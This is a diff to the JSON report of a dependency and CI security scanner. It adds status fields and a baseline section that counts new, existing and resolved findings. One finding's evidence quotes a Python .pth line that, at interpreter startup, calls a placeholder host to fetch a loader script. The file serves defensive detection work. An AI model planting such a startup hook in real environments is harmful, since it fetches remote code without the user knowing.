@@ -11,6 +11,7 @@
       "id": "malicious.npm.axios",
       "title": "Known compromised Axios release",
       "severity": "critical",
+      "status": "new",
       "confidence": "high",
       "ecosystem": "npm",
       "package": "axios",
@@ -23,6 +24,7 @@
       "id": "risk.github.pull-request-target",
       "title": "Workflow uses pull_request_target",
       "severity": "high",
+      "status": "new",
       "confidence": "high",
       "ecosystem": "github-actions",
       "file": ".github/workflows/ci.yml",
@@ -33,6 +35,7 @@
       "id": "risk.github.nondeterministic-install",
       "title": "Workflow uses a non-deterministic install command",
       "severity": "medium",
+      "status": "existing",
       "confidence": "high",
       "ecosystem": "github-actions",
       "file": ".github/workflows/bun-ci.yml",
@@ -43,11 +46,35 @@
       "id": "risk.pypi.pth-exec",
       "title": "Python .pth file executes code during interpreter startup",
       "severity": "critical",
+      "status": "existing",
       "confidence": "medium",
       "ecosystem": "pip",
       "file": "src/evil.pth",
       "evidence": "import urllib.request; urllib.request.urlopen('https://example.invalid/loader.py')",
       "remediation": "Remove unexpected .pth executable code and rebuild the virtual environment from trusted, hashed requirements."
     }
-  ]
+  ],
+  "baseline": {
+    "path": ".depsaber/baseline.json",
+    "new": 2,
+    "existing": 2,
+    "resolved": 1,
+    "newBySeverity": {
+      "critical": 1,
+      "high": 1
+    },
+    "resolvedFindings": [
+      {
+        "id": "risk.github.unpinned-action",
+        "title": "Workflow action is not pinned to a full commit SHA",
+        "severity": "medium",
+        "status": "resolved",
+        "confidence": "high",
+        "ecosystem": "github-actions",
+        "file": ".github/workflows/old-ci.yml",
+        "evidence": "uses: owner/action@tag",
+        "remediation": "Pin third-party actions to a reviewed 40-character commit SHA."
+      }
+    ]
+  }
 }
